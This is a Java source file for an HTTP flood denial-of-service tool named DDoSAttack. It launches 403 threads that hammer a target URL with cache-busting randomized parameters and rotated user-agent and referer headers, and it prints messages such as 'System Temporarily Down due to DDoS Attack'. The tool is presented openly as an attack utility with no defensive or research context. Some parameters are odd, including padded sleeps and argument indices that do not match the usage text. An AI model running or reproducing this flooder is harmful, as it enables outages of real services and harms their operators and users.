import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class DDoSAttack {

    // Global params
    private static String url = "";
    private static String host = "";
    private static int port = 80;  // Default port
    private static List<String> headersUserAgents = new ArrayList<>();
    private static List<String> headersReferers = new ArrayList<>();
    private static int requestCounter = 0;
    private static int flag = 0;
    private static int kill = 0;
    private static double attackDuration = 99000000.0;  // Set the attack duration to 99 million hours
    private static double pauseDuration = 2;   // Set the pause duration in hours
    private static int responseDelay = 5;   // Set the response delay in seconds
    private static Object lockObject = new Object();  // Used for thread synchronization

    private static void incCounter() {
        synchronized (lockObject) {
            requestCounter++;
        }
    }

    private static void setFlag(int val) {
        synchronized (lockObject) {
            flag = val;
        }
    }

    private static void setKill() {
        synchronized (lockObject) {
            kill = 1;
        }
    }

    // Generates a user agent list
    private static void userAgentList() {
        headersUserAgents.add("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3");
        // ... (remaining user agents)
    }

    // Generates a referer list
    private static void refererList() {
        headersReferers.add("http://www.google.com/?q=");
        // ... (remaining referers)
    }

    // Builds random ASCII string
    private static String buildBlock(int size) {
        Random random = new Random();
        StringBuilder outStr = new StringBuilder();
        for (int i = 0; i < size; i++) {
            int a = random.nextInt(26) + 65;
            outStr.append((char) a);
        }
        return outStr.toString();
    }

    private static void usage() {
        System.out.println("---------------------------------------------------");
        System.out.println("USAGE: DDoSAttack.java <url> [port] [attack_duration]");
        System.out.println("you can add 'kill' after url, to autoshut after dos");
        System.out.println("---------------------------------------------------");
    }

    // HTTP request
    private static int httpCall(String url) {
        userAgentList();
        refererList();
        int code = 0;
        String paramJoiner = url.contains("?") ? "&" : "?";
        String randomParam = buildBlock(new Random().nextInt(8) + 3) + '=' + buildBlock(new Random().nextInt(8) + 3);

        try {
            URL targetUrl = new URL(url + paramJoiner + randomParam);
            HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", headersUserAgents.get(new Random().nextInt(headersUserAgents.size())));
            connection.setRequestProperty("Cache-Control", "no-cache");
            connection.setRequestProperty("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
            connection.setRequestProperty("Referer", headersReferers.get(new Random().nextInt(headersReferers.size())) + buildBlock(new Random().nextInt(5) + 5));
            connection.setRequestProperty("Keep-Alive", String.valueOf(new Random().nextInt(10) + 110));
            connection.setRequestProperty("Connection", "keep-alive");
            connection.setRequestProperty("Host", host);

            long desiredSleepMilliseconds = (long) (responseDelay * 1000);
            long startTime = System.currentTimeMillis();

            while ((System.currentTimeMillis() - startTime) < desiredSleepMilliseconds) {
                // Sleep for a shorter duration as needed
                Thread.sleep(9999);
            }

            connection.connect();

            int responseCode = connection.getResponseCode();
            incCounter();

            if (responseCode == 403) {
                setFlag(1);
                System.out.println("Response Code 403");
                code = 403;
            }

            connection.disconnect();
        } catch (IOException | InterruptedException ex) {
            ex.printStackTrace();
        }

        return code;
    }

    // HTTP caller thread - High Power
    static class HTTPThread implements Runnable {
        public void run() {
            try {
                double startTime = System.nanoTime() / 1e9;  // Record the start time
                // Extend the attack duration using a factor
                double durationFactor = 9999;
                while (flag < 2 && (System.nanoTime() / 1e9 - startTime) < (attackDuration * durationFactor)) {
                    int code = httpCall(url);
                    if (code == 403 && kill == 1) {
                        setFlag(2);
                    }
                }
                System.out.println("\n-- High Power Attack has been broadcasted to all devices... --");  // Change this line
                System.out.println("\n-- System Temporarily Down due to DDoS Attack --");
                Thread.sleep((int) (pauseDuration * 3600 * 1000));  // Pause for the specified duration
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    // Monitors HTTP threads and counts requests
    static class MonitorThread implements Runnable {
        public void run() {
            int previous = requestCounter;
            while (flag == 0) {
                if (previous + 100 < requestCounter && previous != requestCounter) {
                    System.out.println(requestCounter + " Requests Sent");
                    previous = requestCounter;
                }
            }
            if (flag == 2) {
                System.out.println("\n-- DDoS Attack Finished --");
            }
        }
    }

    // Execute
    public static void main(String[] args) {
        if (args.length < 1) {
            usage();
            System.exit(0);
        } else {
            if ("help".equals(args[0])) {
                usage();
                System.exit(0);
            } else {
                System.out.println("-- DDoS Attack Started --");
                if (args.length >= 3) {
                    port = Integer.parseInt(args[2]);
                }
                if (args.length >= 4) {
                    attackDuration = Double.parseDouble(args[3]);
                }
                if (args.length >= 5) {
                    if ("kill".equals(args[4])) {
                        setKill();
                    }
                }
                url = args[0];
                System.out.println("Target URL: " + url + ", Port: " + port + ", Attack Duration: " + attackDuration + " hours");  // Add this line for debugging
                if (url.contains("/")) {
                    url = url + "/";
                }
                String pattern = "http://([^/:]*)[:/]?.*";
                java.util.regex.Pattern regexPattern = java.util.regex.Pattern.compile(pattern);
                java.util.regex.Matcher matcher = regexPattern.matcher(url);
                if (matcher.matches()) {
                    host = matcher.group(1);
                } else {
                    System.out.println("Error: Unable to extract host from URL.");
                    System.exit(0);
                }
                for (int i = 0; i < 403; i++) {
                    Thread t = new Thread(new HTTPThread());
                    t.start();
                }
                Thread monitorThread = new Thread(new MonitorThread());
                monitorThread.start();

                // Keep the application running
                try {
                    Thread.sleep(Long.MAX_VALUE);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
